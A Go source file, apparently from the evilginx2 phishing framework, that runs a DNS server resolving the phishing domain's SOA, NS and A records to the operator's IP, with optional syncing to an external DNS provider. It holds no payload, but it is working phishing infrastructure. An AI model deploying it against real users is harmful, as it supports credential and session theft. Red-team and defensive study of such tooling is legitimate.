package core

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"

	"github.com/kgretzky/evilginx2/log"
)

type Nameserver struct {
	srv         *dns.Server
	cfg         *Config
	bind        string
	serial      uint32
	ctx         context.Context
	externalDNS *ExternalDNS
	disabled    bool
}

func NewNameserver(cfg *Config) (*Nameserver, error) {
	o := &Nameserver{
		serial:   uint32(time.Now().Unix()),
		cfg:      cfg,
		bind:     fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), cfg.GetDnsPort()),
		ctx:      context.Background(),
		disabled: false,
	}

	// Initialize external DNS manager
	o.externalDNS = NewExternalDNS(cfg)

	o.Reset()

	return o, nil
}

func (o *Nameserver) Reset() {
	dns.HandleFunc(pdom(o.cfg.general.Domain), o.handleRequest)
}

func (o *Nameserver) Start() {
	// Check if external DNS is enabled
	if o.cfg.IsDNSEnabled() && o.externalDNS.IsEnabled() {
		log.Info("external DNS management is enabled via %s - local DNS server disabled", o.externalDNS.GetProvider().GetName())
		o.disabled = true
		
		// Auto-sync if enabled
		if o.cfg.IsDNSAutoSyncEnabled() {
			hostnames := o.cfg.GetActiveHostnames("")
			if len(hostnames) > 0 {
				go func() {
					time.Sleep(2 * time.Second) // Wait for config to fully load
					if err := o.externalDNS.SyncHostnames(hostnames); err != nil {
						log.Error("dns auto-sync failed: %v", err)
					}
				}()
			}
		}
		return
	}

	go func() {
		o.srv = &dns.Server{Addr: o.bind, Net: "udp"}
		if err := o.srv.ListenAndServe(); err != nil {
			log.Fatal("Failed to start nameserver on: %s", o.bind)
		}
	}()
}

// GetExternalDNS returns the external DNS manager
func (o *Nameserver) GetExternalDNS() *ExternalDNS {
	return o.externalDNS
}

// RefreshExternalDNS refreshes the external DNS configuration
func (o *Nameserver) RefreshExternalDNS() {
	o.externalDNS.RefreshProvider()
}

// IsExternalDNSEnabled returns true if external DNS is enabled and configured
func (o *Nameserver) IsExternalDNSEnabled() bool {
	return o.cfg.IsDNSEnabled() && o.externalDNS.IsEnabled()
}

// SyncDNSRecords syncs DNS records with external provider
func (o *Nameserver) SyncDNSRecords() error {
	if !o.IsExternalDNSEnabled() {
		return fmt.Errorf("external DNS is not enabled or configured")
	}
	
	hostnames := o.cfg.GetActiveHostnames("")
	if len(hostnames) == 0 {
		return fmt.Errorf("no active hostnames to sync")
	}
	
	return o.externalDNS.SyncHostnames(hostnames)
}

func (o *Nameserver) handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	if o.cfg.general.Domain == "" || o.cfg.general.ExternalIpv4 == "" {
		return
	}

	soa := &dns.SOA{
		Hdr:     dns.RR_Header{Name: pdom(o.cfg.general.Domain), Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 300},
		Ns:      "ns1." + pdom(o.cfg.general.Domain),
		Mbox:    "hostmaster." + pdom(o.cfg.general.Domain),
		Serial:  o.serial,
		Refresh: 900,
		Retry:   900,
		Expire:  1800,
		Minttl:  60,
	}
	m.Ns = []dns.RR{soa}

	fqdn := strings.ToLower(r.Question[0].Name)

	switch r.Question[0].Qtype {
	case dns.TypeSOA:
		log.Debug("DNS SOA: " + fqdn)
		m.Answer = append(m.Answer, soa)
	case dns.TypeA:
		log.Debug("DNS A: " + fqdn + " = " + o.cfg.general.ExternalIpv4)
		rr := &dns.A{
			Hdr: dns.RR_Header{Name: fqdn, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 300},
			A:   net.ParseIP(o.cfg.general.ExternalIpv4),
		}
		m.Answer = append(m.Answer, rr)
	case dns.TypeNS:
		log.Debug("DNS NS: " + fqdn)
		if fqdn == pdom(o.cfg.general.Domain) {
			for _, i := range []int{1, 2} {
				rr := &dns.NS{
					Hdr: dns.RR_Header{Name: pdom(o.cfg.general.Domain), Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 300},
					Ns:  "ns" + strconv.Itoa(i) + "." + pdom(o.cfg.general.Domain),
				}
				m.Answer = append(m.Answer, rr)
			}
		}
	}
	w.WriteMsg(m)
}

func pdom(domain string) string {
	return domain + "."
}
